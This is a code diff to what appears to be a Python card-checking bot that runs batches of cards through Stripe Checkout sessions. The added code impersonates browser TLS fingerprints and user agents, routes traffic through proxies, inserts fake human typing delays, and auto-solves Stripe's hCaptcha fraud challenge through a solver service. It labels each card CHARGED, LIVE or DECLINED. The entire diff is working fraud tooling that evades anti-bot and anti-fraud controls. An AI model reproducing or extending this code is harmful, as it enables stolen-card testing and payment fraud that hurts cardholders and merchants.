@@ -4,7 +4,7 @@ import random
 import asyncio
 import aiohttp
 import base64
-from urllib.parse import unquote
+from urllib.parse import unquote, quote_plus
 
 from curl_cffi.requests import AsyncSession as CurlSession
 
@@ -17,6 +17,7 @@ from utils.stripe import (
     generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
 )
 from utils.proxy import get_proxy_url
+from utils.captcha import solve_hcaptcha
 
 
 def extract_checkout_url(text: str) -> str:
@@ -107,8 +108,15 @@ async def decode_pk_from_url(url: str) -> dict:
     return result
 
 
-async def get_checkout_info(url: str) -> dict:
-    """Get full checkout info from a Stripe checkout URL."""
+async def get_checkout_info(url: str, tls_profile: str = None, user_agent: str = None, proxy: str = None, cookies_str: str = None) -> dict:
+    """Get full checkout info from a Stripe checkout URL.
+    
+    Args:
+        tls_profile: TLS profile to use (for consistency with confirm)
+        user_agent: User-Agent to use (for consistency with confirm)
+        proxy: Proxy URL to use (for consistency with confirm)
+        cookies_str: Real Stripe cookies from warm session
+    """
     start = time.perf_counter()
     result = {
         "url": url,
@@ -128,6 +136,8 @@ async def get_checkout_info(url: str) -> dict:
         "success_url": None,
         "cancel_url": None,
         "init_data": None,
+        "pi_id": None,
+        "pi_client_secret": None,
         "error": None,
         "time": 0
     }
@@ -138,21 +148,32 @@ async def get_checkout_info(url: str) -> dict:
         result["cs"] = decoded.get("cs")
 
         if result["pk"] and result["cs"]:
+            # Use provided TLS profile or fallback to random
             bp = get_random_browser_profile()
+            init_tls = tls_profile or bp['tls']
             eid = generate_eid()
+            result["eid"] = eid  # Save for reuse in confirm
             body = f"key={result['pk']}&eid={eid}&browser_locale=en-US&redirect_type=url"
 
-            async with CurlSession(impersonate=bp['tls']) as s:
+            headers = get_stripe_headers()
+            if user_agent:
+                headers["user-agent"] = user_agent
+            if cookies_str:
+                headers["cookie"] = cookies_str
+
+            async with CurlSession(impersonate=init_tls) as s:
                 r = await s.post(
                     f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
-                    headers=get_stripe_headers(),
+                    headers=headers,
                     data=body,
+                    proxy=proxy,
                     timeout=20
                 )
                 init_data = r.json()
 
             if "error" not in init_data:
                 result["init_data"] = init_data
+                result["api_version"] = init_data.get("api_version", "2025-02-24.acacia")
 
                 acc = init_data.get("account_settings", {})
                 result["merchant"] = acc.get("display_name") or acc.get("business_name")
@@ -205,6 +226,13 @@ async def get_checkout_info(url: str) -> dict:
 
                 result["success_url"] = init_data.get("success_url")
                 result["cancel_url"] = init_data.get("cancel_url")
+
+                # Extract PaymentIntent info for direct confirm flow
+                pi_obj = init_data.get("payment_intent") or {}
+                if pi_obj.get("id"):
+                    result["pi_id"] = pi_obj["id"]
+                    result["pi_client_secret"] = pi_obj.get("client_secret", "")
+                    print(f"[DEBUG] PaymentIntent: {result['pi_id'][:20]}...")
             else:
                 result["error"] = init_data.get("error", {}).get("message", "Init failed")
         else:
@@ -216,6 +244,7 @@ async def get_checkout_info(url: str) -> dict:
 
     result["time"] = round(time.perf_counter() - start, 2)
     return result
+
 
 
 async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, user_id: int = None, max_retries: int = 2, session_ctx: dict = None, card_index: int = 0) -> dict:
@@ -306,12 +335,23 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 if attempt > 0:
                     print(f"[DEBUG] Retry attempt {attempt}...")
 
-                # Only eid changes per card (unique per request)
-                eid = generate_eid()
+                # Reuse eid from init for first card (browser behavior)
+                # Only generate new eid for retry/subsequent cards
+                if card_index == 0:
+                    eid = checkout_data.get("eid") or generate_eid()
+                else:
+                    eid = generate_eid()
+
+                # Realistic delay before confirm — mimic user typing card details
+                # First card: longer (reading page), subsequent: faster
+                if card_index == 0:
+                    await asyncio.sleep(random.uniform(2.0, 4.5))
+                else:
+                    await asyncio.sleep(random.uniform(0.8, 2.0))
 
                 print(f"[DEBUG] TLS Profile: {profile} | Confirming with fingerprints...")
 
-                # Build confirm body — Stripe.js style with full card data + fingerprints
+                # Build confirm body — Stripe.js style
                 conf_body = (
                     f"eid={eid}"
                     f"&payment_method_data[type]=card"
@@ -335,6 +375,9 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 # Add pasted_fields only if not empty
                 if pasted:
                     conf_body += f"&payment_method_data[pasted_fields]={pasted}"
+                # Add referrer — real Stripe.js always sends this
+                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
+                conf_body += f"&payment_method_data[referrer]={checkout_url}"
                 conf_body += (
                     f"&expected_amount={total}"
                     f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
@@ -345,15 +388,15 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                     f"&expected_payment_method_type=card"
                     f"&key={pk}"
                     f"&init_checksum={checksum}"
-                    f"&_stripe_version=2025-02-24.acacia"
+                    f"&_stripe_version={checkout_data.get('api_version', '2025-02-24.acacia')}"
                 )
 
-                # Use curl_cffi headers + matched UA + Stripe cookies
+                # Use curl_cffi headers + matched UA + cookies
                 headers = get_stripe_headers()
-                headers["cookie"] = stripe_cookies
-                # Set UA from session context to match TLS profile
                 if session_ctx and session_ctx.get("user_agent"):
                     headers["user-agent"] = session_ctx["user_agent"]
+                if session_ctx and session_ctx.get("cookies"):
+                    headers["cookie"] = session_ctx["cookies"]
 
                 r = await s.post(
                     f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
@@ -394,8 +437,121 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                         result["status"] = "CHARGED"
                         result["response"] = "Payment Successful"
                     elif st == "requires_action":
-                        result["status"] = "3DS"
-                        result["response"] = "3DS Skipped"
+                        # ━━━ Detailed next_action analysis ━━━
+                        next_action = pi.get("next_action") or {}
+                        na_type = next_action.get("type", "unknown")
+                        
+                        print(f"[DEBUG] ⚠️ requires_action detected!")
+                        print(f"[DEBUG] next_action.type: {na_type}")
+                        print(f"[DEBUG] next_action full: {str(next_action)[:500]}")
+                        
+                        if na_type == "use_stripe_sdk":
+                            sdk_data = next_action.get("use_stripe_sdk", {})
+                            sdk_type = sdk_data.get("type", "unknown")
+                            stripe_js = sdk_data.get("stripe_js") or {}
+                            print(f"[DEBUG] 3DS SDK type: {sdk_type}")
+                            
+                            if sdk_type == "intent_confirmation_challenge":
+                                site_key = ""
+                                if isinstance(stripe_js, dict):
+                                    site_key = stripe_js.get("site_key", "")
+                                print(f"[DEBUG] 🔒 hCaptcha challenge — site_key={site_key[:20] if site_key else 'N/A'}")
+                                
+                                # ━━━ Auto-solve hCaptcha via NopeCHA ━━━
+                                pi_id = pi.get("id", "")
+                                pi_secret = pi.get("client_secret", "")
+                                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
+                                captcha_proxy = proxy_url if proxy_url else None
+                                captcha_ua = headers.get("user-agent", "")
+                                
+                                # Extract rqdata for hCaptcha Enterprise (Stripe always sends this)
+                                rqdata = ""
+                                if isinstance(stripe_js, dict):
+                                    rqdata = stripe_js.get("rqdata", "")
+                                if rqdata:
+                                    print(f"[DEBUG] 🔑 rqdata found: {rqdata[:30]}...")
+                                
+                                captcha_token = await solve_hcaptcha(
+                                    site_key=site_key,
+                                    url=checkout_url,
+                                    rqdata=rqdata or None,
+                                    proxy=captcha_proxy,
+                                    user_agent=captcha_ua,
+                                )
+                                
+                                if captcha_token and pi_id and pi_secret:
+                                    print(f"[DEBUG] ✅ Captcha solved! Re-confirming PI...")
+                                    
+                                    # Use verification_url from Stripe response (for Checkout Sessions)
+                                    verify_path = ""
+                                    if isinstance(stripe_js, dict):
+                                        verify_path = stripe_js.get("verification_url", "")
+                                    
+                                    if verify_path:
+                                        verify_url = f"https://api.stripe.com{verify_path}"
+                                    else:
+                                        verify_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/verify_challenge"
+                                    
+                                    print(f"[DEBUG] Verify URL: {verify_url}")
+                                    
+                                    # Build verify body with hcaptcha token
+                                    reconfirm_body = (
+                                        f"client_secret={pi_secret}"
+                                        f"&hcaptcha_token={captcha_token}"
+                                        f"&key={pk}"
+                                    )
+                                    
+                                    try:
+                                        r2 = await s.post(
+                                            verify_url,
+                                            headers=headers,
+                                            data=reconfirm_body,
+                                            proxy=proxy_url,
+                                            timeout=25
+                                        )
+                                        reconf = r2.json()
+                                        print(f"[DEBUG] Re-confirm response: {str(reconf)[:200]}...")
+                                        
+                                        reconf_status = reconf.get("status", "")
+                                        if reconf_status == "succeeded":
+                                            result["status"] = "CHARGED"
+                                            result["response"] = "Solved Captcha ✅"
+                                            print(f"[DEBUG] ✅ CHARGED after captcha solve!")
+                                        elif "error" in reconf:
+                                            re_err = reconf["error"]
+                                            re_dc = re_err.get("decline_code", "")
+                                            re_msg = re_err.get("message", "Failed after captcha")
+                                            if re_dc in LIVE_DECLINE_CODES:
+                                                result["status"] = "LIVE"
+                                            else:
+                                                result["status"] = "DECLINED"
+                                            result["response"] = f"Solved Captcha → [{re_dc or re_err.get('code', '')}] [{re_msg}]"
+                                            print(f"[DEBUG] Declined after captcha: {re_dc} - {re_msg}")
+                                        else:
+                                            result["status"] = "SOLVED CAPTCHA"
+                                            result["response"] = f"Captcha Solved → {reconf_status}"
+                                            print(f"[DEBUG] Captcha solved, PI status: {reconf_status}")
+                                    except Exception as e2:
+                                        print(f"[DEBUG] ❌ Re-confirm error: {str(e2)[:60]}")
+                                        result["status"] = "SOLVED CAPTCHA"
+                                        result["response"] = f"Captcha Solved — confirm failed"
+                                else:
+                                    if not captcha_token:
+                                        print(f"[DEBUG] ❌ Captcha solve failed")
+                                    result["status"] = "3DS"
+                                    result["response"] = f"CAPTCHA [{sdk_type}] — solve failed"
+                            else:
+                                result["status"] = "3DS"
+                                result["response"] = f"3DS Challenge [{sdk_type}]"
+                        elif na_type == "redirect_to_url":
+                            redirect_url = next_action.get("redirect_to_url", {}).get("url", "")
+                            print(f"[DEBUG] 3DS redirect URL: {redirect_url[:200]}")
+                            result["status"] = "3DS"
+                            result["response"] = f"3DS Redirect [{na_type}]"
+                        else:
+                            print(f"[DEBUG] 🔍 Unknown next_action type: {na_type}")
+                            result["status"] = "3DS"
+                            result["response"] = f"3DS [{na_type}]"
                     elif st == "requires_payment_method":
                         result["status"] = "DECLINED"
                         result["response"] = "Card Declined"
